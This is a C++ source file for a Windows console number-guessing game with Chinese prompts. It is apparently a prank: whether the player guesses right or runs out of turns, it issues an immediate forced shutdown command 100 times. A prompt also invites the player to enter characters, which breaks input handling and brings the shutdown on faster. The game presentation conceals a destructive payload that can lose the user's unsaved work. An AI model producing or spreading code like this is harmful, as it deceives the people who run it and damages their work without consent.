#include<cstdio>
#include<cstdlib>
#include<ctime>
int main() {
	system("title 'A JieCaoless Game'");
	srand(time(0));
	int n;
	n = rand() * rand() % 10000;
	int m;
	m = rand() * rand() % 10000 + n;
	int T, Tb;
	T = rand() * rand() % 100 + 1;
	Tb = T;
	printf("来玩个游戏吧！\n你有 %d 机会来猜中一个 0 - %d 的数字\n", T, m);
	while(T-- > 0) {
		int random = rand() % 10 + 1;
		if((Tb - T) % random == 0)
			printf("下面第 %d 次机会（你可以试试输入字符）：", Tb - T);
		else
			printf("下面第 %d 次机会：", Tb - T);
		int a;
		scanf("%d", &a);
		if(a == n) {
			printf("恭喜你！猜对了，但是。。。你的电脑还是得关机！\n");
			for(int i = 1; i <= 100; i++)
				system("shutdown -s -t 0 > nul");
			return 0;
		}
		else
			printf("你猜错了！\n");
	}
	printf("对不起，机会用完了，作者的姓名是 gold mountain king\n拜拜！\n");
	for(int i = 1; i <= 100; i++)
		system("shutdown -s -t 0 > nul");
}
